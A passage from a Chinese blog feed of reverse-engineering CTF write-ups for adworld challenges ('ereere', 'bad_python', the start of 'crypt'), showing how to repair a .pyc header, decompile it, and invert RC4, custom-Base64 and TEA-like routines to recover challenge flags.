string">"ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ=="</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210"</span>  <span class="token comment"># string1表示更换后的码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># string2表示原始码表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64还原: "</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 key 还原成初始码表加密后的结果</span>Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密，bytes型</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64解密: "</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span>byte_4A0860 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>aFlag1233213211 <span class="token operator">=</span> <span class="token string">"flag&#123;123321321123badbeef012&#125;"</span><span class="token comment"># rc4_init</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    byte_4A0860<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>v4 <span class="token operator">=</span> <span class="token number">0</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> v3 <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v5    v4 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> v4 <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">)</span><span class="token punctuation">:</span>        v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s_box:"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># rc4_crypt</span>v4 <span class="token operator">=</span> <span class="token number">0</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    v5 <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> v5    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> byte_4A0860<span class="token punctuation">[</span><span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{RC_f0ur_And_Base_s1xty_f0ur_Encrypt_!}</p></blockquote><h2 id="Python（引用库）-1"><a href="#Python（引用库）-1" class="headerlink" title="Python（引用库）"></a>Python（引用库）</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere9.png" alt="攻防世界-ereere9.png"></p><h2 id="Python（完整实现）-1"><a href="#Python（完整实现）-1" class="headerlink" title="Python（完整实现）"></a>Python（完整实现）</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere10.png" alt="攻防世界-ereere10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】bad_python</title>
      <link href="/posts/98f0f2cc.html"/>
      <url>/posts/98f0f2cc.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉 <mark>python 逆向中反编译工具 uncompyle6</mark> 的使用方法</p></li><li><p>了解 <mark>.pyc 文件头</mark>的结构</p></li><li><p>通过自己<mark>手动生成对应 python 版本的 .pyc 文件来修复文件头</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=c5796270-3b28-11ed-9802-fa163e4fa66d&task_category_id=4">【攻防世界】bad_python</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到一个 .pyc 的 Python 反编译文件</p><p>用本机 uncompyle6 反编译失败，提示 KeyError: ‘3.10.4’，本机用的 Python 版本是 3.10.4，应该是 Python 版本不对</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python1.png" alt="攻防世界-bad_python1.png"></p><p>根据文件名“pyre.cpython-36.pyc”，应该是提示该文件由 python 3.6 编译而来</p><p>拖到 win10 虚拟机，安装 Python 3.6.0</p><p>用虚拟机的 uncompyle6 反编译：<code>pip install uncompyle6</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python2.png" alt="攻防世界-bad_python2.png"></p><p>编译失败，提示：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">assert <span class="token function">iscode</span><span class="token punctuation">(</span>co<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token string">""</span><span class="token string">"&#123;co&#125; does not smell like code"</span><span class="token string">""</span>AssertionError<span class="token operator">:</span> None does not smell like code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用记事本打开，内容是乱码，用 exeinfo pe 查看，发现并未识别成 .pyc 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python3.png" alt="攻防世界-bad_python3.png"></p><p>用 WinHex 查看文件头很奇怪，应该是文件头被修改</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python4.png" alt="攻防世界-bad_python4.png"></p><blockquote><p>按照网上给的 pyc 文件头：03 F3 0D 0A，修改之后发现没什么用</p></blockquote><p>pyc 文件头占文件最开始的 16字节，只需修改第一行即可<br>并且 <mark>pyc 文件头好像并不固定</mark>，比如文件头包含：python 的版本、文件修改时间等信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python5.png" alt="攻防世界-bad_python5.png"></p><p>尝试自己生成一个由 python 3.6.0 版本编译的 .pyc 文件，再将正常的文件头拷过来，恢复损坏的文件</p><p>随意创建一个 python 文件，使用 <code>python -m py_compile C:\Users\wyy\Desktop\My_test.py</code> 生成 .pyc</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python6.png" alt="攻防世界-bad_python6.png"></p><p>成功后，会在 .py 文件夹下生成一个 <code>__pycache__</code> 文件夹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python7.png" alt="攻防世界-bad_python7.png"></p><p>查看自己生成的 pyc 文件的文件头，正常</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python8.png" alt="攻防世界-bad_python8.png"></p><p>用正常的文件头数据替换掉损坏文件的第一行，再次编译，编译成功</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python9.png" alt="攻防世界-bad_python9.png"></p><p>将代码复制出来：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delta <span class="token operator">=</span> <span class="token number">195935983</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v0<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        sum1<span class="token punctuation">.</span>value <span class="token operator">+=</span> delta        v1<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v0<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">9</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>     v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span> v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input your flag:'</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong!'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        v2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        a <span class="token operator">+=</span> encrypt<span class="token punctuation">(</span><span class="token punctuation">[</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token number">4006073346</span><span class="token punctuation">,</span> <span class="token number">2582197823</span><span class="token punctuation">,</span> <span class="token number">2235293281</span><span class="token punctuation">,</span> <span class="token number">558171287</span><span class="token punctuation">,</span> <span class="token number">2425328816</span><span class="token punctuation">,</span> <span class="token number">1715140098</span><span class="token punctuation">,</span> <span class="token number">986348143</span><span class="token punctuation">,</span> <span class="token number">1948615354</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong!'</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is flag&#123;%s&#125;'</span> <span class="token operator">%</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑就是将 flag 每 4 字节进行 <code>bytes_to_long()</code> 的转换<br>然后每相邻的两个 4 字节的 <code>bytes_to_long()</code> 结果为一组进行加密处理<br>加密过程比较类似于 tea 算法，对循环过程进行逆向解密即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes  <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>      v0 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      delta <span class="token operator">=</span> <span class="token number">195935983</span>      sum1<span class="token punctuation">.</span>value <span class="token operator">=</span> delta <span class="token operator">*</span> <span class="token number">32</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          v1<span class="token punctuation">.</span>value <span class="token operator">-=</span> <span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v0<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">9</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>          sum1<span class="token punctuation">.</span>value <span class="token operator">-=</span> delta          v0<span class="token punctuation">.</span>value <span class="token operator">-=</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>      <span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span> v1<span class="token punctuation">.</span>value  enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4006073346</span><span class="token punctuation">,</span> <span class="token number">2582197823</span><span class="token punctuation">,</span>         <span class="token number">2235293281</span><span class="token punctuation">,</span> <span class="token number">558171287</span><span class="token punctuation">,</span>         <span class="token number">2425328816</span><span class="token punctuation">,</span> <span class="token number">1715140098</span><span class="token punctuation">,</span>         <span class="token number">986348143</span><span class="token punctuation">,</span> <span class="token number">1948615354</span><span class="token punctuation">]</span>  k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span>  b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      b <span class="token operator">+=</span> decrypt<span class="token punctuation">(</span><span class="token punctuation">[</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> enc<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment"># [1416114547, 1597076319, 1096762721, 1937334096, 2037671984, 1851744082, 863397202, 1936023344]  </span>flag <span class="token operator">=</span> <span class="token string">b''</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          v <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'     '</span><span class="token punctuation">)</span>          flag <span class="token operator">+=</span> v <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>  <span class="token comment"># b'Th1s_1s_A_Easy_Pyth0n__R3veRse_0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>Th1s_1s_A_Easy_Pyth0n__R3veRse_0</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-bad_python10.png" alt="攻防世界-bad_python10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】crypt</title>
      <link href="/posts/5bfdd0f4.html"/>
      <url>/posts/5bfdd0f4.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉 <mark>RC4 算法</mark>的特点和思想，要能根据伪代码识别出 RC4 算法</p></li><li><p>注意 <code>&amp; 0xff</code> 是为了达到 <code>% 256</code> 的效果，<mark>num &amp; 0xff 等价于 num % 256</mark></p></li><li><p><mark>IDA中的伪代码可以直接运行，但需要注意部分参数的数据类型，必要时需要自己手动更改</mark>，标准 C++ 代码中有部分写法与 IDA 编译器扩展下的写法不同</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=2b3c9bf6-1c7d-11ed-abf3-fa163e4fa609&task_category_id=4">【攻防世界】crypt</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>IDA 打开，直接定位到 main</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypt1.png" alt="攻防世界-crypt1.png"></p><p>首先将字符串 <code>&quot;12345678abcdefghijklmnopqrspxyz&quot;</code> 复制到 Str<br>然后将后面的位置通过 <code>memset(&amp;Str[32], 0, 0x60ui64)</code> 填充<strong>空字符</strong><br><code>sub_1400054D0(&quot;%s&quot;, v10)</code> 输入字符串 v10<br>主要是 <code>sub_140001120</code> 和 <code>sub_140001240</code> 函数的处理未知</p><p><code>sub_140001120(v9, Str, v3)</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypt2.png" alt="攻防世界-crypt2.png"></p><p><code>sub_140001240(v9, v10, v4)</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypt3.png" alt="攻防世界-crypt3.png"></p><p>观察 <code>sub_140001120</code> 函数可以发现有两个 256 的 for 循环</p><p>第一个 for 循环中 <code>v9[i] = i</code> 就只是一个赋值操作<br>第二个 for 循环中可以发现一个交换顺序的 swap 操作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再结合 <code>sub_140001240</code> 函数中，也包含一个 for 循环，并且也包含 swap 操作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>根据 <code>sub_140001120</code> 函数和 <code>sub_140001240</code> 函数的特点可以推断，这两步操作就是 RC4 算法的实现<br><code>sub_140001120</code> 函数就是 <code>rc4_init()</code>，用于初始化<br><code>sub_140001240</code> 函数就是 <code>rc4_crypt()</code>，用于加解密</p><p>由于 RC4 是对称加密算法，明文处理得密文，密文处理得明文，因此只需按照给出的算法还原即可</p><p>根据 <code>sub_140001120(v9, Str, v3)</code> 的代码<br>结合 <code>rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)</code> 的结构<br>可以推断 Str 是加解密的密钥 Key，v9 是 s 盒</p><p>根据 <code>sub_140001240(v9, v10, v4)</code> 的代码<br>结合 <code>rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)</code> 的结构<br>根据 <code>sub_140001240</code> 中的最后一个异或操作： <code>*(a2 + i) ^= LOBYTE(v9[(v8 + v7)])</code>，由于 <code>a2</code> 是作为 <code>v10[]</code> 的形参传入的，所以最终的 <code>v10[]</code> 中的数据（即：<code>*(a2 + i)</code>）就是 RC4 加密后的内容</p><p>所以加密前的内容可以根据 <code>LOBYTE(v9[(v8 + v7)]) ^ v10[]</code> 得到</p><p>最终的 